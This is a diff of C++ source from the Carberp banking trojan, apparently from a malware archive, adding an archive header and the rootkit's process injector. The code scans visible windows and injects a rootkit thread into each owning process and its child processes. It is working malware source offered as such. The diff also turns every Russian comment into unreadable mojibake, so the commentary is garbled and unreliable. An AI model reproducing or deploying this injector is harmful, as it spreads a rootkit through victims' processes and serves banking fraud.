@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -24,7 +35,7 @@ namespace INJECTORRDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define INJKDBG INJECTORRDEBUGSTRINGS::DBGOutMessage<>
 
 //---------------------------------------------------------------------------
@@ -33,12 +44,12 @@ namespace INJECTOR
 {
 	typedef struct TInjector
 	{
-		bool      IsWin64;     // Признак того, что процесс работает в 64 битной вине
-		TBotList* Injected;    // Список процессов, в которые был совершён инжект
-		LPBYTE    NameBuf;     // Буфер получения имени ехе процесса
-		DWORD     NameBufSize; // размер буфера получения имени ехе процесса
+		bool      IsWin64;     // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		TBotList* Injected;    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		LPBYTE    NameBuf;     // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		DWORD     NameBufSize; // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-		TInjectFunction InjectFunction; // Указатель на внедряемую функцию
+		TInjectFunction InjectFunction; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	} *PInjector;
 
 	typedef struct TProcessInfo
@@ -63,11 +74,11 @@ namespace INJECTOR
 
 
 //------------------------------------------------------
-//  StartInjector - Функция стартует процесс инжектора
+//  StartInjector - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 BOOL WINAPI StartInjector()
 {
-	INJKDBG("INJECTOR", "Стартуем инжектор");
+	INJKDBG("INJECTOR", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	#ifdef AGENTFULLTEST
 		return StartThread(INJECTOR::InjectorProc, NULL) != NULL;
 	#else
@@ -78,17 +89,17 @@ BOOL WINAPI StartInjector()
 
 
 //------------------------------------------------------
-//  InjectorProc - Основная функция инжектора, которая
-//                 постоянно мониторит запущенные процессы
+//  InjectorProc - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//                 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
 {
-	// Алгоритм работы следующий:
-	// Перебираем все кна рабочего стола и инжектимся
-	// в поцесы владельцы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	BOT::Initialize();
 
-	INJKDBG("INJECTOR", "Запущен процесс инжектра");
+	INJKDBG("INJECTOR", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	TInjector Injector;
 	Injector.IsWin64  = IsWIN64();
@@ -96,12 +107,12 @@ DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
 	Injector.NameBufSize = 1024;
 	Injector.NameBuf = (LPBYTE)MemAlloc(Injector.NameBufSize);
 
-	// Для старта определяем основную функцию руткита
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Injector.InjectFunction = RootkitThread;
 
 	/*
-	// Загружаем плагин
-	INJKDBG("INJECTOR", "Загружаем bot.plug");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	INJKDBG("INJECTOR", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ bot.plug");
 	for (int i = 0; i < 2; i++)
 	{
 		LPVOID Plug = NULL;
@@ -117,8 +128,8 @@ DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
 
 
 
-		// В случае ошибки получения адреса функции
-		// принудительно обновляем плагин
+		// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		MemoryFreeLibrary(PlugHandle);
 		UpdateBotPlug();
 	}
@@ -126,28 +137,28 @@ DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
 	if (!Injector.InjectFunction) pExitProcess(0); */
 
 
-    INJKDBG("INJECTOR", "Стартуем");
+    INJKDBG("INJECTOR", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	while (!BOT::Terminated())
 	{
-		// Перебираем главные окна окна
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		pEnumWindows(WndEnumCallBak, &Injector);
 		pSleep(500);
 	}
 
-	// При завершении работы выходим из процесса
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pExitProcess(0);
 	return 0;
 }
 
 //------------------------------------------------------
-// GetProcessInfo - Функция полуает информацию о прцессе
+// GetProcessInfo - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 bool INJECTOR::GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info)
 {
 	ClearStruct(Info);
 	Info.PID = PID;
-	// Открываем процесс
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	CLIENT_ID ClientID;
 	ClientID.UniqueProcess = (HANDLE)PID;
 	ClientID.UniqueThread  = 0;
@@ -158,13 +169,13 @@ bool INJECTOR::GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info)
 	if (pZwOpenProcess(&Process,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID) != STATUS_SUCCESS)
 		return false;
 
-	// Определяем кк запущен процесс
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pIsWow64Process(Process, &Info.IsWOW64);
 
 	if (Injector->IsWin64 && !Info.IsWOW64)
 		return false;
 
-	// Получаем имя процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PUNICODE_STRING Str = (PUNICODE_STRING)Injector->NameBuf;
 	Str->Length = 0;
 	Str->MaximumLength = Injector->NameBufSize - sizeof(UNICODE_STRING);
@@ -173,26 +184,26 @@ bool INJECTOR::GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info)
 
 	if(pZwQueryInformationProcess(Process, ProcessImageFileName, Str, Len, &Len) == STATUS_SUCCESS)
 	{
-		// Успешно получили имя процесса
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Info.ExeName = Str->Buffer;
 	}
 
 
-	// Закрываем процесс
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pZwClose(Process);
     return true;
 }
 
 
 //------------------------------------------------------
-//  WndEnumCallBak - Функция обработки найденного окна
+//  WndEnumCallBak - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
 {
-	// Окно должно быть видимым и не иметь владельца
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (pIsWindowVisible(Wnd) && !pGetWindow(Wnd, GW_OWNER))
 	{
-		// Получаем пид пресса которому принадлежит окно
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		DWORD PID = 0;
 		pGetWindowThreadProcessId(Wnd, &PID);
 		if (PID)
@@ -203,8 +214,8 @@ BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
 			TProcessInfo Info;
 			if (GetProcessInfo(Injector, PID, Info))
 			{
-				// Проверяем необходимость инжекта
-				// Разрешаем инжект в 32 разрядной винде или в 32 разрядные процессы
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				Inject(Injector, &Info);
 			}
 
@@ -217,8 +228,8 @@ BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
 
 void INJECTOR::InjectInChildProcesses(PInjector Injector, PProcessInfo Parent)
 {
-	// Функция инжектится в дочерние процессы
-	// и параллельно роверяем список обработанных процессов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PROCESSENTRY32 pe;
 	pe.dwSize = sizeof(pe);
 	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
@@ -243,21 +254,21 @@ void INJECTOR::InjectInChildProcesses(PInjector Injector, PProcessInfo Parent)
 
 
 //------------------------------------------------------
-// Inject - Функция осуществляет инжект в казанный процесс
+// Inject - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 bool INJECTOR::Inject(PInjector Injector, PProcessInfo Info)
 {
 	DWORD Hash = Info->ExeName.Hash();
-	// Проверяем не инжектились ли в данный процесс
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (int i = 0; i < Injector->Injected->Count(); i++)
 	{
 		PInjectItem Item = (PInjectItem)Injector->Injected->GetItem(i);
 		if (Item->PID == Info->PID && Item->NameHash == Hash)
 		{
-			// При повторном инжекте пробуем заинжектиться в дочерние процессы.
-			// связано с тем, что некоторые программы создают один основной и
-			// при следующем запуске создают его дочерние процессы.
-			// В частности такое поведение замечено за Internet Explorer
+			// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+			// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Internet Explorer
 			InjectInChildProcesses(Injector, Info);
 
 			return false;
@@ -268,13 +279,13 @@ bool INJECTOR::Inject(PInjector Injector, PProcessInfo Info)
 	{
 		#ifndef AGENTFULLTEST
 			BOOL Injected = InjectIntoProcess2(Info->PID, Injector->InjectFunction);
-			INJKDBG("INJECTOR", "Инжект: Result=%d App=%S", Injected, Info->ExeName.t_str());
+			INJKDBG("INJECTOR", "пїЅпїЅпїЅпїЅпїЅпїЅ: Result=%d App=%S", Injected, Info->ExeName.t_str());
 		#else
 			BOOL Injected = TRUE;
 		#endif
     }
 
-	// Сохраняем информацию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PInjectItem Item = CreateStruct(TInjectItem);
 	Item->PID = Info->PID;
 	Item->NameHash = Hash;
